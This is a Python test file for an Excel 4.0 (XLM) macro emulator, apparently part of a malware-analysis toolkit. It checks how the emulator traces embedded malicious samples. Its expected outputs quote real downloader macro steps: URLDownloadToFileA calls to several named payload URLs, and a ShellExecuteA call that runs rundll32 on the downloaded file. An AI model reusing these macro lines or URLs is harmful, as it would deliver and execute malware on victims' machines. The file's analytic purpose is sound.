"""
The emulator end to end: every run of every embedded XLM sample and of the XLSB maldoc finishes
inside its budget, the statuses a run leaves its cells are pinned, and the output levels show
exactly the steps their severity promises.
"""
from __future__ import annotations

from refinery.lib.scripts.xlm import XlmEngine, XlmView, visible_steps
from refinery.lib.scripts.xlm.trace import XlmStatus
from test import TestBase
from test.lib.excel.samples import (
    XLM_MACRO_ASSIGN_BIFF8,
    XLM_MACRO_FORMULA_XLSM,
    XLM_MACRO_NAMES_BIFF8,
    XLM_MACRO_RPN_BIFF8,
    XLM_MACRO_TEXT_XLSM,
)

_MALDOC = 'dc44bbfc845fc078cf38b9a3543a32ae1742be8c6320b81cf6cd5a8cee3c696a'

_SAMPLES = [
    ('rpn', XLM_MACRO_RPN_BIFF8),
    ('names', XLM_MACRO_NAMES_BIFF8),
    ('assign', XLM_MACRO_ASSIGN_BIFF8),
    ('text', XLM_MACRO_TEXT_XLSM),
    ('formula', XLM_MACRO_FORMULA_XLSM),
]


class TestEmulator(TestBase):

    @staticmethod
    def _steps(data: bytes | bytearray) -> list:
        return list(XlmEngine(XlmView(data)).run())

    def test_every_sample_finishes_its_run_inside_the_budget(self):
        for name, data in _SAMPLES:
            with self.subTest(sample=name):
                steps = self._steps(data)
                self.assertNotEqual(steps, [])
                self.assertLess(len(steps), 1_000_000)
                self.assertEqual(
                    [
                        step.status
                        for step in steps
                        if step.status is XlmStatus.Error
                    ],
                    [],
                )

    def test_the_last_step_of_every_run_is_pinned(self):
        for name, data, sheet, row, col, status in [
            ('rpn', XLM_MACRO_RPN_BIFF8, 'mP9mScF1m5', 10, 20, XlmStatus.End),
            ('names', XLM_MACRO_NAMES_BIFF8, 'Acf444', 9591, 1, XlmStatus.PartialEvaluation),
            ('assign', XLM_MACRO_ASSIGN_BIFF8, 'sod', 25282, 148, XlmStatus.End),
            ('text', XLM_MACRO_TEXT_XLSM, 'Doc1', 121, 52, XlmStatus.PartialEvaluation),
            ('formula', XLM_MACRO_FORMULA_XLSM, 'PCWV', 34, 7, XlmStatus.FullEvaluation),
            ('maldoc', self.download_sample(_MALDOC), 'Tiposa1', 30, 7, XlmStatus.FullEvaluation),
        ]:
            with self.subTest(sample=name):
                steps = self._steps(data)
                self.assertEqual(
                    (steps[-1].sheet, steps[-1].row, steps[-1].col, steps[-1].status),
                    (sheet, row, col, status),
                )

    def test_the_statuses_of_every_run_are_pinned(self):
        for name, data, expected in [
            ('rpn', XLM_MACRO_RPN_BIFF8, ['End', 'FullEvaluation', 'PartialEvaluation']),
            ('names', XLM_MACRO_NAMES_BIFF8, ['PartialEvaluation']),
            ('assign', XLM_MACRO_ASSIGN_BIFF8, [
                'End', 'FullBranching', 'FullEvaluation', 'PartialEvaluation',
            ]),
            ('text', XLM_MACRO_TEXT_XLSM, ['End', 'FullEvaluation', 'PartialEvaluation']),
            ('formula', XLM_MACRO_FORMULA_XLSM, ['FullEvaluation', 'PartialEvaluation']),
            ('maldoc', self.download_sample(_MALDOC), ['FullEvaluation', 'PartialEvaluation']),
        ]:
            with self.subTest(sample=name):
                steps = self._steps(data)
                self.assertEqual(
                    sorted({step.status for step in steps}, key=lambda status: status.name),
                    [XlmStatus[status] for status in expected],
                )

    def test_every_output_level_shows_the_steps_its_severity_promises(self):
        for name, data, counts in [
            ('rpn', XLM_MACRO_RPN_BIFF8, [20, 19, 8, 3]),
            ('names', XLM_MACRO_NAMES_BIFF8, [1, 1, 0, 0]),
            ('assign', XLM_MACRO_ASSIGN_BIFF8, [141, 86, 8, 5]),
            ('text', XLM_MACRO_TEXT_XLSM, [22, 9, 5, 4]),
            ('formula', XLM_MACRO_FORMULA_XLSM, [11, 10, 8, 7]),
            ('maldoc', self.download_sample(_MALDOC), [27, 6, 1, 1]),
        ]:
            with self.subTest(sample=name):
                steps = self._steps(data)
                self.assertEqual(
                    [len(list(visible_steps(steps, level))) for level in range(4)],
                    counts,
                )

    def test_the_first_level_hides_the_moves_and_the_cells_that_are_no_command(self):
        steps = self._steps(XLM_MACRO_TEXT_XLSM)
        self.assertEqual(
            [(step.sheet, step.row, step.col) for step in visible_steps(steps, 1)],
            [
                ('Doc1', 109, 52),
                ('Doc1', 110, 52),
                ('Doc1', 118, 52),
                ('Doc1', 120, 52),
                ('Doc1', 93, 56),
                ('Doc1', 95, 56),
                ('Doc1', 97, 56),
                ('Doc1', 99, 56),
                ('Doc1', 114, 62),
            ],
        )
        self.assertEqual(
            [step.text for step in visible_steps(steps, 1)],
            [
                'SET.VALUE(BD108,"URLMo")',
                'SET.VALUE(BD109,"URLDownloadToFile")',
                'SET.VALUE(BD119,"JJCCBB")',
                'SET.VALUE(Doc1!BD121,"rundll3")',
                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                '"https://maharaniworld.com/ds/3103.gif","..\\iekdhfe.dsk1",0,0)',
                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                '"https://aycconsultoriaempresarial.com/ds/3103.gif","..\\iekdhfe.dsk2",0,0)',
                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                '"https://sgb.ac.ke/ds/3103.gif","..\\iekdhfe.dsk3",0,0)',
                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
                '"https://hashmati.com/ds/3103.gif","..\\iekdhfe.dsk4",0,0)',
                'HALT()',
            ],
        )

    def test_the_second_level_hides_every_ordinary_command(self):
        steps = self._steps(XLM_MACRO_RPN_BIFF8)
        self.assertEqual(
            [(step.sheet, step.row, step.col) for step in visible_steps(steps, 2)],
            [
                ('mP9mScF1m5', 1, 20),
                ('mP9mScF1m5', 3, 20),
                ('mP9mScF1m5', 4, 20),
                ('mP9mScF1m5', 5, 20),
                ('mP9mScF1m5', 6, 20),
                ('mP9mScF1m5', 7, 20),
                ('mP9mScF1m5', 9, 20),
                ('mP9mScF1m5', 10, 20),
            ],
        )

    def test_the_third_level_extracts_the_quoted_strings_of_the_triage_commands(self):
        steps = self._steps(XLM_MACRO_RPN_BIFF8)
        self.assertEqual(
            [step.text for step in visible_steps(steps, 3)],
            [
                '"Windows"',
                '"urlmon"\n"URLDownloadToFileA"\n"JJCCJJ"\n"https://gfhudnjv.xyz/vjd7f2js"'
                '\n"c:\\Users\\Public\\hff2f5o.html"',
                '"Shell32"\n"ShellExecuteA"\n"JJCCCJJ"\n"open"'
                '\n"C:\\Windows\\system32\\rundll32.exe"'
                '\n"c:\\Users\\Public\\hff2f5o.html,DllRegisterServer"',
            ],
        )

    def test_the_third_level_of_the_maldoc_keeps_its_registered_downloader(self):
        steps = self._steps(self.download_sample(_MALDOC))
        self.assertEqual(
            [(step.sheet, step.row) for step in visible_steps(steps, 3)],
            [('Vtreytr', 22)],
        )
        self.assertEqual(
            next(iter(visible_steps(steps, 3))).text,
            '"uRlMon"\n"URLDownloadToFileA"\n"JJCCBB"\n"Drwrgdfghfhf"',
        )
